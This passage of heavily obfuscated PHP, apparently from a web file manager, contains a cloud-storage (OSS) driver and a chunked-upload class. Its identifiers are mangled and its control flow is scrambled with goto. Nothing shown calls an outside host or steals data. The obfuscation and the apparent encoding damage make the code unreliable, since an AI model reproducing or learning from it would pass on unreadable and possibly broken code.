array($E¯´ì´×Ş[215] => $dğï°šÒã, $E¯´ì´×Ş[165] => $C×½œô„©ğ . $E¯´ì´×Ş[8] . $this->pathEncode($Fµñ²‹÷•), $E¯´ì´×Ş[216] => gmdate($E¯´ì´×Ş[1187]), $E¯´ì´×Ş[89] => $Fµñ²‹÷•); } public function multiUploadAuthData($E«®ÜÖÅÄ, $e©ŒåÇš½Ş = array()) { goto b±ò£â×Øë; eÌ“ß£¾ƒ: $b‰°İ£ÃÍ = $Aø§™†£¡[1190] . $this->accessKey . $Aø§™†£¡[4] . $dÅšØ­ÑÍ„; if (strpos($EªŠÊ»­•, $Aø§™†£¡[219]) === 0) { $b‰°İ£ÃÍ = array($Aø§™†£¡[225] => $b‰°İ£ÃÍ, $Aø§™†£¡[216] => $D´´ó‚¡³Ğ); if ($C¹«ˆˆÑ­) { $b‰°İ£ÃÍ = array_merge($b‰°İ£ÃÍ, $C¹«ˆˆÑ­); } } return $b‰°İ£ÃÍ; goto fº–åÑ¢á; b±ò£â×Øë: $Aø§™†£¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D´´ó‚¡³Ğ = isset($e©ŒåÇš½Ş[$Aø§™†£¡[216]]) ? $e©ŒåÇš½Ş[$Aø§™†£¡[216]] : gmdate($Aø§™†£¡[1187]); $EªŠÊ»­• = isset($e©ŒåÇš½Ş[$Aø§™†£¡[156]]) ? $e©ŒåÇš½Ş[$Aø§™†£¡[156]] : $Aø§™†£¡[33]; goto eò¶›â‘²­; F¯ÎÅ˜Òº: if (!empty($e©ŒåÇš½Ş[$Aø§™†£¡[1189]])) { $F¾İ‹Ôœç… = array_merge(array($DäÎšùÛ‡”[4]), $e©ŒåÇš½Ş[$Aø§™†£¡[1189]]); sort($F¾İ‹Ôœç…); $DäÎšùÛ‡”[4] = implode($Aø§™†£¡[174], $F¾İ‹Ôœç…); } $CŒ–Ê»„‰Ø = implode($Aø§™†£¡[174], $DäÎšùÛ‡”); $dÅšØ­ÑÍ„ = base64_encode(hash_hmac($Aø§™†£¡[223], $CŒ–Ê»„‰Ø, $this->secret, !0)); goto eÌ“ß£¾ƒ; eò¶›â‘²­: $aÉ¦‚Ò’ = $E«®ÜÖÅÄ; if (isset($e©ŒåÇš½Ş[$Aø§™†£¡[89]])) { $aÉ¦‚Ò’ = $e©ŒåÇš½Ş[$Aø§™†£¡[89]]; unset($e©ŒåÇš½Ş[$Aø§™†£¡[89]]); } if (isset($e©ŒåÇš½Ş[$Aø§™†£¡[217]])) { $e©ŒåÇš½Ş[$Aø§™†£¡[216]] = $D´´ó‚¡³Ğ; return $this->listUploadParts($aÉ¦‚Ò’, $e©ŒåÇš½Ş); } goto fÀˆ› è§¬; fÀˆ› è§¬: $DäÎšùÛ‡” = array($Aø§™†£¡[218], $Aø§™†£¡[33], $Aø§™†£¡[115], $D´´ó‚¡³Ğ, "\170\x2d\x6f\163\x73\55\144\x61\164\x65\72{$D´´ó‚¡³Ğ}", $Aø§™†£¡[8] . $this->bucket . $Aø§™†£¡[8] . $aÉ¦‚Ò’ . $EªŠÊ»­•); if (strpos($EªŠÊ»­•, $Aø§™†£¡[219]) === 0) { $DäÎšùÛ‡”[0] = $Aø§™†£¡[220]; if ($C¹«ˆˆÑ­ = $this->trafficLimit($Aø§™†£¡[1179])) { $aÉ¦‚Ò’ = $Aø§™†£¡[1188]; array_splice($DäÎšùÛ‡”, 5, 0, $aÉ¦‚Ò’ . $Aø§™†£¡[4] . $C¹«ˆˆÑ­[$aÉ¦‚Ò’]); } } if (isset($e©ŒåÇš½Ş[$Aø§™†£¡[221]]) && $e©ŒåÇš½Ş[$Aø§™†£¡[221]] == $Aø§™†£¡[222]) { $DäÎšùÛ‡”[0] = $Aø§™†£¡[222]; } goto F¯ÎÅ˜Òº; fº–åÑ¢á: } public function listUploadParts($f§™Ö†÷÷, $EÙ¶™£™×) { goto cí¸‚‹‹ù; CÔ¯Œİ™ÑÈ: return array($EÑ†“ˆàÏ„[225] => $Fµƒ™¥ŸÚÍ, $EÑ†“ˆàÏ„[216] => $EÙ¶™£™×[$EÑ†“ˆàÏ„[216]], $EÑ†“ˆàÏ„[227] => $e¸ÕÚ›Š»); goto A™ğ†±ĞÙ; E™±Èö„»: unset($EÙ¶™£™×[$EÑ†“ˆàÏ„[217]], $EÙ¶™£™×[$EÑ†“ˆàÏ„[221]]); $Fµƒ™¥ŸÚÍ = $this->multiUploadAuthData($f§™Ö†÷÷, $EÙ¶™£™×); if (empty($Fµƒ™¥ŸÚÍ)) { return !1; } goto CÔ¯Œİ™ÑÈ; cí¸‚‹‹ù: $EÑ†“ˆàÏ„ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e÷’ÈÄù” = parse_url_query($EÙ¶™£™×[$EÑ†“ˆàÏ„[156]]); $C‡´¸ã’Î = $this->client->listParts($this->bucket, $this->pathEncode($f§™Ö†÷÷), $e÷’ÈÄù”[$EÑ†“ˆàÏ„[215]]); goto Eîöë¸Ú¬Ù; Eîöë¸Ú¬Ù: $D°ŠªÁ”¾› = $C‡´¸ã’Î->getListPart(); $e¸ÕÚ›Š» = array(); foreach ($D°ŠªÁ”¾› as $d¡¼®……ùÉ) { $e¸ÕÚ›Š»[] = array($EÑ†“ˆàÏ„[1170] => $d¡¼®……ùÉ->getPartNumber(), $EÑ†“ˆàÏ„[1171] => trim($d¡¼®……ùÉ->getETag(), $EÑ†“ˆàÏ„[112])); } goto E™±Èö„»; A™ğ†±ĞÙ: } public function download($EŸ×èÉ™¨, $C‡‡•İß) { if ($this->isFolder($EŸ×èÉ™¨)) { return !1; } try { $Bèí‚á×¢Ë = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $C‡‡•İß); $Bèí‚á×¢Ë = $this->trafficLimit($_SERVER[ºÖÙÂŒäÉê‡][104], $Bèí‚á×¢Ë); $this->client->getObject($this->bucket, $this->pathEncode($EŸ×èÉ™¨), $Bèí‚á×¢Ë); } catch (OSS\Core\OssException $cëš…¡¡®) { return !1; } return $C‡‡•İß; } public function fileSubstr($d¢›è§½ì, $fÀƒ¶ÜÀŸç = 0, $BÂ¤·‘¹¥ò = false) { if ($fÀƒ¶ÜÀŸç === -1) { $DÙ–¦í‚ = array(); } else { if ($BÂ¤·‘¹¥ò === !1) { $eøÅÎ‡ö· = $this->size($d¢›è§½ì); } else { $eøÅÎ‡ö· = $fÀƒ¶ÜÀŸç + $BÂ¤·‘¹¥ò - 1; } $DÙ–¦í‚ = array(OSS\OssClient::OSS_RANGE => "{$fÀƒ¶ÜÀŸç}\55{$eøÅÎ‡ö·}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d¢›è§½ì), $DÙ–¦í‚); } catch (OSS\Core\OssException $d»âÏÔÇëã) { think_exception($d»âÏÔÇëã->getMessage()); return !1; } } private function trafficLimit($fŸ‰˜£×¾ê, $F§ƒ¼ÎÄåÜ = array()) { goto CÆ“²‰„Ï¢; dö§´éÅ´¬: if (!$fÒÂ‚ÛÀÊì) { return $F§ƒ¼ÎÄåÜ; } $fÒÂ‚ÛÀÊì = $fÒÂ‚ÛÀÊì < 819200 ? 819200 : ($fÒÂ‚ÛÀÊì > 838860800 ? 838860800 : $fÒÂ‚ÛÀÊì); $F§ƒ¼ÎÄåÜ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($fÒÂ‚ÛÀÊì); goto fÔ§„ùŠ«¤; fÔ§„ùŠ«¤: return $F§ƒ¼ÎÄåÜ; goto BƒÙáµÎ¥†; CÆ“²‰„Ï¢: $cí¶¾Á =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($fŸ‰˜£×¾ê == $cí¶¾Á[1179] && $this->isUploadServer() || $fŸ‰˜£×¾ê == $cí¶¾Á[104] && $this->isFileOutServer()) { return $F§ƒ¼ÎÄåÜ; } $fÒÂ‚ÛÀÊì = floatval($GLOBALS[$cí¶¾Á[6]][$cí¶¾Á[84]][$cí¶¾Á[102]][$fŸ‰˜£×¾ê]) * 1024 * 1024 * 8; goto dö§´éÅ´¬; BƒÙáµÎ¥†: } public function link($E´áÚØÇ¼¤, $c†‰®ÑçŞ = array()) { $d‰íÎ†ƒ¡Ä =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->exist($E´áÚØÇ¼¤) || $this->isFolder($E´áÚØÇ¼¤)) { return !1; } try { $c†‰®ÑçŞ = $this->trafficLimit($d‰íÎ†ƒ¡Ä[104], $c†‰®ÑçŞ); $aæÌãÖ»‡Ó = $this->client->signUrl($this->bucket, $this->pathEncode($E´áÚØÇ¼¤), 3600 * 12, $d‰íÎ†ƒ¡Ä[222], $c†‰®ÑçŞ); return $this->getCdnLink($aæÌãÖ»‡Ó); } catch (OSS\Core\OssException $bíÌ¬ñÂì) { return !1; } } public function fileOut($cà÷¢ˆŠ®Û, $C™íË‹ìÊ = false, $e —Şë§Ñ¬ = false, $BÔÈÁ‡öäÆ = '') { goto f®ùŠ¢Ó; fƒ±®¯ç: $FêÊŞÕÕ£ç = get_file_mime(get_path_ext($e —Şë§Ñ¬)); if ($FêÊŞÕÕ£ç == $e‹ÌÖÔÔ“Â[207]) { return parent::fileOut($cà÷¢ˆŠ®Û, $C™íË‹ìÊ, $e —Şë§Ñ¬, $BÔÈÁ‡öäÆ); } $C™íË‹ìÊ = $C™íË‹ìÊ ? $e‹ÌÖÔÔ“Â[208] : $e‹ÌÖÔÔ“Â[209]; goto D…äÏƒèñÆ; D…äÏƒèñÆ: $bÓ¨ˆñš¶¤ = array(OSS\OssClient::OSS_SUB_RESOURCE => $e‹ÌÖÔÔ“Â[1191] . rawurlencode("{$C™íË‹ìÊ}\73\146\x69\154\x65\156\141\155\x65\75{$e —Şë§Ñ¬}")); $bÓ¨ˆñš¶¤[OSS\OssClient::OSS_SUB_RESOURCE] .= $e‹ÌÖÔÔ“Â[1192] . $FêÊŞÕÕ£ç; $FÒÈ°øæ· = $this->link($cà÷¢ˆŠ®Û, $bÓ¨ˆñš¶¤); goto a…é™¨“„; a…é™¨“„: $this->fileOutLink($FÒÈ°øæ·); goto açŒÛÃ±Ğ²; f®ùŠ¢Ó: $e‹ÌÖÔÔ“Â =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$e —Şë§Ñ¬) { $e —Şë§Ñ¬ = $this->pathThis($cà÷¢ˆŠ®Û); } $e —Şë§Ñ¬ = rawurlencode($e —Şë§Ñ¬); goto fƒ±®¯ç; açŒÛÃ±Ğ²: } public function fileOutServer($aê®Í˜, $Fß¼©§Ñó™ = false, $B¬ÄÒêÙÊø = false, $C¤ğŠ¼Î½ = '') { parent::fileOut($aê®Í˜, $Fß¼©§Ñó™, $B¬ÄÒêÙÊø, $C¤ğŠ¼Î½); } public function fileOutImage($e †´ËëïË, $féÁ¸¢ÈÑ = 250) { $aƒƒ›ëõ§ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ºÖÙÂŒäÉê‡][1193] . $féÁ¸¢ÈÑ); $D«‚°·¿© = $this->link($e †´ËëïË, $aƒƒ›ëõ§); $this->fileOutLink($D«‚°·¿©); } public function fileOutImageServer($d’Ì‡ÊÆæ, $EÅÖŞŠ¥Å = 250) { parent::fileOutImage($d’Ì‡ÊÆæ, $EÅÖŞŠ¥Å); } public function fileOutLink($b†ØÙ‡–‘ß) { $D’ªô­ä¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->isCdnHost() && substr($b†ØÙ‡–‘ß, 0, 7) == $D’ªô­ä¤[1098]) { $b†ØÙ‡–‘ß = $D’ªô­ä¤[1099] . substr($b†ØÙ‡–‘ß, 7); } header($D’ªô­ä¤[152] . $b†ØÙ‡–‘ß); die; } public function hashMd5($E‰È™õœì–, $D¬¸¨‰¿ªç = '') { $c´Öõàœ½ƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eä†öŒÓ£Â = $this->objectMeta($E‰È™õœì–); if (!$eä†öŒÓ£Â) { return $c´Öõàœ½ƒ[33]; } if (!isset($eä†öŒÓ£Â[$c´Öõàœ½ƒ[1166]]) && !empty($D¬¸¨‰¿ªç)) { $DÅ†›ã¤¿« = $this->updateObjMeta($E‰È™õœì–, array($c´Öõàœ½ƒ[1166] => $D¬¸¨‰¿ªç)); $eä†öŒÓ£Â[$c´Öõàœ½ƒ[1166]] = $DÅ†›ã¤¿« ? $D¬¸¨‰¿ªç : $c´Öõàœ½ƒ[33]; } return isset($eä†öŒÓ£Â[$c´Öõàœ½ƒ[1166]]) ? strtolower($eä†öŒÓ£Â[$c´Öõàœ½ƒ[1166]]) : $c´Öõàœ½ƒ[33]; } public function size($fêÑÁœÒ¦¶) { $C¯‹¾èîÁ = $this->objectMeta($fêÑÁœÒ¦¶); return $C¯‹¾èîÁ ? $C¯‹¾èîÁ[$_SERVER[ºÖÙÂŒäÉê‡][77]] : 0; } public function info($bĞ‡÷˜İ¼) { if ($this->isFolder($bĞ‡÷˜İ¼)) { return $this->folderInfo($bĞ‡÷˜İ¼); } else { if ($this->isFile($bĞ‡÷˜İ¼)) { return $this->fileInfo($bĞ‡÷˜İ¼); } } return !1; } public function exist($cù¦½ì˜»¸) { return $this->isFile($cù¦½ì˜»¸) || $this->isFolder($cù¦½ì˜»¸); } public function isFile($cêÆ…š¨ŞÎ) { return !$this->isFolder($cêÆ…š¨ŞÎ) && $this->objectMeta($cêÆ…š¨ŞÎ); } public function isFolder($EÄ½ÔâŠĞ) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][228], $EÄ½ÔâŠĞ); } protected function objectMeta($dĞòİ÷Û·) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][229], $dĞòİ÷Û·); } protected function _objectMeta($cÙÀÏù”“§) { $d½³Ö¼Ä¡÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; try { $cíÚ‚Ó¨Ø¨ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cÙÀÏù”“§)); } catch (OSS\Core\OssException $fµõòëË³©) { $cíÚ‚Ó¨Ø¨ = !1; } if ($cíÚ‚Ó¨Ø¨) { $cíÚ‚Ó¨Ø¨[$d½³Ö¼Ä¡÷[77]] = intval($cíÚ‚Ó¨Ø¨[$d½³Ö¼Ä¡÷[1173]]); } return $cíÚ‚Ó¨Ø¨; } protected function _isFolder($fğˆ–ô¡¬£) { $a³Û÷‰›Åâ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($fğˆ–ô¡¬£ == $a³Û÷‰›Åâ[33] || $fğˆ–ô¡¬£ == $a³Û÷‰›Åâ[8]) { return !0; } $c³‘½ İô = array($a³Û÷‰›Åâ[1163] => $a³Û÷‰›Åâ[8], $a³Û÷‰›Åâ[192] => rtrim($fğˆ–ô¡¬£, $a³Û÷‰›Åâ[8]) . $a³Û÷‰›Åâ[8], $a³Û÷‰›Åâ[1164] => 1, $a³Û÷‰›Åâ[1165] => $a³Û÷‰›Åâ[33]); $d¨’–âÕ›Ò = $this->client->listObjects($this->bucket, $c³‘½ İô); if ($d¨’–âÕ›Ò->getObjectList() || $d¨’–âÕ›Ò->getPrefixList()) { return !0; } return !1; } } goto CÅËæ­ô; Aô‘…†Á…£: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto fÅÃ²ëã; BìŸÚÄµÑ: $this->checkSize(); $this->tempPathInit(); goto Aö¢…±‘…; fÅÃ²ëã: $dï¿õñ³Š =& $_SERVER[ºÖÙÂŒäÉê‡]; global $in; $this->in =& $in; goto b¸¸ÂÎÂîò; b¸¸ÂÎÂîò: if (!empty($_FILES)) { $Cí±ËÎÑËó = $_FILES[$dï¿õñ³Š[163]]; $this->uploadFile = $Cí±ËÎÑËó[$dï¿õñ³Š[1929]]; if (!$this->uploadFile && $Cí±ËÎÑËó[$dï¿õñ³Š[1201]] > 0) { show_json($this->errorInfo($Cí±ËÎÑËó[$dï¿õñ³Š[1201]]), !1); } } else { if (isset($in[$dï¿õñ³Š[391]])) { $this->uploadFile = isset($in[$dï¿õñ³Š[1930]]) ? $dï¿õñ³Š[1931] : $dï¿õñ³Š[1776]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto BìŸÚÄµÑ; Aö¢…±‘…: } public function upload() { goto bíºåŒ³ó; bô‚îŞ†ø…: if ($eÎ¶‰Œè‘ñ > 1 && $fæã×Èİâ‹ <= 0) { show_json($EÕ²ñíÑè§[1936], !1); } if ($fæã×Èİâ‹ > $aé¥áéÒ‘Å) { $eÎ¶‰Œè‘ñ = 1; } if ($eÎ¶‰Œè‘ñ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto b¦Ó¥­Æ©; Aé­¸®×: ignore_timeout(); if (!$this->checkChunkHash($FÙÁÜ©ÍŸÅ)) { $this->showJson($EÕ²ñíÑè§[1946], !1); } $this->statusSet(!1); goto DÁ‹˜’¯²š; EóŸ•Æ‡èé: $E…ÜÏÙ—İÉ = $dø©®ƒÌÅ * $fæã×Èİâ‹; $D¥Áõù•À = @fopen($this->tempFile, $EÕ²ñíÑè§[1939]); fseek($D¥Áõù•À, $E…ÜÏÙ—İÉ); goto d‚Â¯˜¢â; b¦Ó¥­Æ©: CacheLock::lock($this->tempFile, 20); $FÙÁÜ©ÍŸÅ = $this->statusGet(); $this->initFileTemp(); goto b¸§ÉÈ«è®; bíºåŒ³ó: $EÕ²ñíÑè§ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dø©®ƒÌÅ = isset($this->in[$EÕ²ñíÑè§[1932]]) ? intval($this->in[$EÕ²ñíÑè§[1932]]) : 0; $eÎ¶‰Œè‘ñ = isset($this->in[$EÕ²ñíÑè§[1933]]) ? intval($this->in[$EÕ²ñíÑè§[1933]]) : 1; goto cóğ„¦Ä¶İ; d‚Â¯˜¢â: $Bâ¬´†¬«¨ = $this->writeTo($fğŠì ““‚, $D¥Áõù•À, $this->tempFile); $F¶“¿éáÁ = IO::hashSimple($fğŠì ““‚); $aé¥áéÒ‘Å = IO::size($fğŠì ““‚); goto FÕ‚ŒÍÜ÷á; cóğ„¦Ä¶İ: $dÄ÷ƒ™·ë¼ = $this->tempFile . $EÕ²ñíÑè§[1934] . $dø©®ƒÌÅ; $aé¥áéÒ‘Å = isset($this->in[$EÕ²ñíÑè§[524]]) ? intval($this->in[$EÕ²ñíÑè§[524]]) : 0; $fæã×Èİâ‹ = isset($this->in[$EÕ²ñíÑè§[1935]]) ? intval($this->in[$EÕ²ñíÑè§[1935]]) : 0; goto bô‚îŞ†ø…; B¹æÑêÆé: $FÙÁÜ©ÍŸÅ[$EÕ²ñíÑè§[1942]][$EÕ²ñíÑè§[1943] . $dø©®ƒÌÅ] = array($EÕ²ñíÑè§[1944] => $E…ÜÏÙ—İÉ, $EÕ²ñíÑè§[1026] => $dø©®ƒÌÅ, $EÕ²ñíÑè§[77] => $aé¥áéÒ‘Å, $EÕ²ñíÑè§[160] => $F¶“¿éáÁ); $this->statusSet($FÙÁÜ©ÍŸÅ); if (count($FÙÁÜ©ÍŸÅ[$EÕ²ñíÑè§[1942]]) != $FÙÁÜ©ÍŸÅ[$EÕ²ñíÑè§[1941]]) { $this->showJson($EÕ²ñíÑè§[1945] . $dø©®ƒÌÅ, !0); } goto Aé­¸®×; FÕ‚ŒÍÜ÷á: @unlink($fğŠì ““‚); if (!$Bâ¬´†¬«¨) { $this->showJson($EÕ²ñíÑè§[1940] . $dø©®ƒÌÅ, !1); } $FÙÁÜ©ÍŸÅ[$EÕ²ñíÑè§[1941]] = $eÎ¶‰Œè‘ñ; goto B¹æÑêÆé; DÁ‹˜’¯²š: CacheLock::unlock($this->tempFile); return $this->tempFile; goto C‘îêñÍ… ; b¸§ÉÈ«è®: $fğŠì ““‚ = $this->moveUploadedFile($dÄ÷ƒ™·ë¼); if ($aé¥áéÒ‘Å > 0 && filesize($fğŠì ““‚) == 0) { $this->showJson($EÕ²ñíÑè§[1937], !1); } if (!$fğŠì ““‚) { $this->showJson(LNG($EÕ²ñíÑè§[1938]), !1); } goto EóŸ•Æ‡èé; C‘îêñÍ… : } private function checkSize() { $BË°ºÜ›¦ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (phpBuild64() || $this->in[$BË°ºÜ›¦[77]] < PHP_INT_MAX) { return; } show_json(LNG($BË°ºÜ›¦[1947]), !1); } private function showJson($Cšã¢º§½, $bóÅµ¡Ó‡¨) { CacheLock::unlock($this->tempFile); if (!$bóÅµ¡Ó‡¨) { return show_json($Cšã¢º§½, $bóÅµ¡Ó‡¨); } show_json($Cšã¢º§½, $bóÅµ¡Ó‡¨); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto bÜŞô¢ù•; dÁæ´ÄÏ‹â: touch($dÀŒ¦‘ÓÉ† . $D¢Ä›¾÷¤Ã[1948]); $Eî‚¤£ö¯ã = isset($this->in[$D¢Ä›¾÷¤Ã[1949]]) ? $this->in[$D¢Ä›¾÷¤Ã[1949]] : !1; if (strlen($Eî‚¤£ö¯ã) < 30) { $Eî‚¤£ö¯ã = md5(USER_ID . $this->in[$D¢Ä›¾÷¤Ã[75]] . $this->fileName . $this->in[$D¢Ä›¾÷¤Ã[77]]); } goto eİµ®„¥à; eİµ®„¥à: $this->tempFile = $dÀŒ¦‘ÓÉ† . $D¢Ä›¾÷¤Ã[1950] . md5($Eî‚¤£ö¯ã . $this->in[$D¢Ä›¾÷¤Ã[1494]]); goto dÁµ¢Š£; bÜŞô¢ù•: $D¢Ä›¾÷¤Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÀŒ¦‘ÓÉ† = TEMP_FILES; @mk_dir($dÀŒ¦‘ÓÉ†); goto dÁæ´ÄÏ‹â; dÁµ¢Š£: } private function moveUploadedFile($EçÆäºµ) { $aĞ»«ÃÓôÀ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F‡ó¡»”ñ = $this->uploadFile; if ($F‡ó¡»”ñ == $aĞ»«ÃÓôÀ[1951]) { @file_put_contents($EçÆäºµ, base64_decode($_REQUEST[$aĞ»«ÃÓôÀ[1952]])); } else { if ($F‡ó¡»”ñ == $aĞ»«ÃÓôÀ[1776]) { $aµÀÙœ’¥“ = @fopen($EçÆäºµ, $aĞ»«ÃÓôÀ[1483]); $this->writeTo($F‡ó¡»”ñ, $aµÀÙœ’¥“, $EçÆäºµ); } else { if (!move_uploaded_file($F‡ó¡»”ñ, $EçÆäºµ)) { return !1; } } } return $EçÆäºµ; } private function writeTo($F­Ã¼…°Êæ, $cÅÆË›°ŒŞ, $D—ğòá©—¶) { goto B¼Ìóñ®ºò; CºŞ¶ÃÀÂ‰: $cĞ½Æ—†£³ = @fopen($F­Ã¼…°Êæ, $dÀŒ£ùƒÙ[1482]); if (!$cĞ½Æ—†£³ || !$cÅÆË›°ŒŞ || !$c’ÁØÚ·) { CacheLock::unlock($eƒ Ï££ßØ); return !1; } while (!feof($cĞ½Æ—†£³)) { fwrite($cÅÆË›°ŒŞ, fread($cĞ½Æ—†£³, 1024 * 200)); } goto EŠ Ûù ù; EŠ Ûù ù: fclose($cĞ½Æ—†£³); fclose($cÅÆË›°ŒŞ); CacheLock::unlock($eƒ Ï££ßØ); goto càØÍÕÜÓğ; B¼Ìóñ®ºò: $dÀŒ£ùƒÙ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eƒ Ï££ßØ = $dÀŒ£ùƒÙ[1953] . $D—ğòá©—¶; $c’ÁØÚ· = CacheLock::lock($eƒ Ï££ßØ, 1); goto CºŞ¶ÃÀÂ‰; càØÍÕÜÓğ: return !0; goto d²ŒÑõª¥™; d²ŒÑõª¥™: } private function statusGet() { goto F„¯­¹Ûâ; A¡óøœÑ: if (!$this->statusData) { $aéŸˆÃ÷‘ = array($dô±Ô¥Æ[28] => $this->fileName, $dô±Ô¥Æ[1941] => 0, $dô±Ô¥Æ[1942] => array()); $this->statusSet($aéŸˆÃ÷‘); } return $this->statusData; goto EÈ¿ô©Á˜–; a«Í•¥®™²: $f µ£–ğ“ = !1; if (file_exists($b¡¥¨‚î®)) { $f µ£–ğ“ = @file_get_contents($b¡¥¨‚î®); } if ($f µ£–ğ“) { $this->statusData = json_decode($f µ£–ğ“, !0); } goto A¡óøœÑ; F„¯­¹Ûâ: $dô±Ô¥Æ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_array($this->statusData)) { return $this->statusData; } $b¡¥¨‚î® = $this->tempFile . $dô±Ô¥Æ[1954]; goto a«Í•¥®™²; EÈ¿ô©Á˜–: } public function statusSet($F¯¿‹½÷ÍŞ) { $Fí¯ÑåÒÁİ = $this->tempFile . $_SERVER[ºÖÙÂŒäÉê‡][1954]; if (!$F¯¿‹½÷ÍŞ) { if (file_exists($Fí¯ÑåÒÁİ)) { @unlink($Fí¯ÑåÒÁİ); } return !0; } $this->statusData = $F¯¿‹½÷ÍŞ; return file_put_contents($Fí¯ÑåÒÁİ, json_encode($F¯¿‹½÷ÍŞ)); } private function initFileTemp() { $dÚÅ¹ìÈˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (file_exists($this->tempFile)) { return; } $eÈ¾öŠ‘ˆ = fopen($this->tempFile, $dÚÅ¹ìÈˆ[1955]); fseek($eÈ¾öŠ‘ˆ, $this->in[$dÚÅ¹ìÈˆ[77]] - 1, SEEK_SET); fwrite($eÈ¾öŠ‘ˆ, $dÚÅ¹ìÈˆ[472]); fclose($eÈ¾öŠ‘ˆ); } public function checkChunk() { goto eÂŸ„ÒÄï; B²ó½Ëè£‘: $f§‡ƒ”†İì = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($f§‡ƒ”†İì[$F×Ã‹•‹±¦[1942]] as $A¹˜ä÷É¾…) { $c·ÔœÉµÓ = $A¹˜ä÷É¾…[$F×Ã‹•‹±¦[160]]; if ($c·ÔœÉµÓ) { $fİ¶ñ˜Íè¬[$F×Ã‹•‹±¦[1956] . $A¹˜ä÷É¾…[$F×Ã‹•‹±¦[1026]]] = $c·ÔœÉµÓ; } } goto aèŸ˜¹èÇ‘; aèŸ˜¹èÇ‘: return $fİ¶ñ˜Íè¬; goto CÏ±ê×”ô–; eÂŸ„ÒÄï: $F×Ã‹•‹±¦ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fİ¶ñ˜Íè¬ = array(); CacheLock::lock($this->tempFile); goto B²ó½Ëè£‘; CÏ±ê×”ô–: } private function checkChunkHash($BîÅÌèÑò¨) { goto C¡£¡®ˆ¯¡; fÓˆ¶‹´‰: return $C‡í®Æ°Š­; goto E…ĞØÚ­‰“; a†•ª®šÅ›: $cÅã›øµ¥Í = _get($this->in, $cÍÚì™èî[1957]); if (strlen($cÅã›øµ¥Í) == 32 && IO::hashSimple($this->tempFile) == $FäéòâÙ  && IO::hashMd5($this->tempFile) == $cÅã›øµ¥Í) { return !0; } $BÉÕ“ÜÊŞè = fopen($this->tempFile, $cÍÚì™èî[1152]); goto aßæÎ‡Øƒ; aßæÎ‡Øƒ: $C‡í®Æ°Š­ = !0; foreach ($BîÅÌèÑò¨[$cÍÚì™èî[1942]] as $DòÜÛÄçÒ) { fseek($BÉÕ“ÜÊŞè, $DòÜÛÄçÒ[$cÍÚì™èî[1944]]); $fÛ  Ç× = PathDriverStream::hash($BÉÕ“ÜÊŞè, $DòÜÛÄçÒ[$cÍÚì™èî[77]]); if ($DòÜÛÄçÒ[$cÍÚì™èî[160]] != $fÛ  Ç×) { $C‡í®Æ°Š­ = !1; break; } } fclose($BÉÕ“ÜÊŞè); goto fÓˆ¶‹´‰; C¡£¡®ˆ¯¡: $cÍÚì™èî =& $_SERVER[ºÖÙÂŒäÉê‡]; if (count($BîÅÌèÑò¨[$cÍÚì™èî[1942]]) != $BîÅÌèÑò¨[$cÍÚì™èî[1941]]) { return !1; } $FäéòâÙ  = _get($this->in, $cÍÚì™èî[1949]); goto a†•ª®šÅ›; E…ĞØÚ­‰“: } public static function fileName() { goto E¦ŞÄ·ÙÁ¶; eçËÔ¦³Êˆ: if (!empty($_FILES)) { $aº³„Ö‹½µ = $aº³„Ö‹½µ ? $aº³„Ö‹½µ : $_FILES[$DÆĞª±™Ûø[163]][$DÆĞª±™Ûø[391]]; } $aº³„Ö‹½µ = str_replace(array($DÆĞª±™Ûø[93], $DÆĞª±™Ûø[8]), array($DÆĞª±™Ûø[8], $DÆĞª±™Ûø[91]), trim($aº³„Ö‹½µ)); if (!is_wap()) { return $aº³„Ö‹½µ; } goto d¬Ø¤İ ¡ª; f‹éºéğ…ä: if ($F”ÄĞŸÅÈ == $DÆĞª±™Ûø[1959] || $F”ÄĞŸÅÈ == $DÆĞª±™Ûø[1960]) { $aº³„Ö‹½µ = date($DÆĞª±™Ûø[687], $d—¼ç±Œ°¥) . $DÆĞª±™Ûø[70] . $in[$DÆĞª±™Ûø[77]] . $DÆĞª±™Ûø[1591]; } else { if ($F”ÄĞŸÅÈ == $DÆĞª±™Ûø[1961]) { $aº³„Ö‹½µ = date($DÆĞª±™Ûø[687], $d—¼ç±Œ°¥) . $DÆĞª±™Ûø[70] . $in[$DÆĞª±™Ûø[77]] . $DÆĞª±™Ûø[1962]; } } return $aº³„Ö‹½µ; goto BÁ†ìî£¹¡; d¬Ø¤İ ¡ª: $d—¼ç±Œ°¥ = strtotime($in[$DÆĞª±™Ûø[1958]]); $d—¼ç±Œ°¥ = $d—¼ç±Œ°¥ ? $d—¼ç±Œ°¥ : time(); $F”ÄĞŸÅÈ = strtolower($aº³„Ö‹½µ); goto f‹éºéğ…ä; E¦ŞÄ·ÙÁ¶: $DÆĞª±™Ûø =& $_SERVER[ºÖÙÂŒäÉê‡]; global $in; $aº³„Ö‹½µ = isset($in[$DÆĞª±™Ûø[28]]) ? 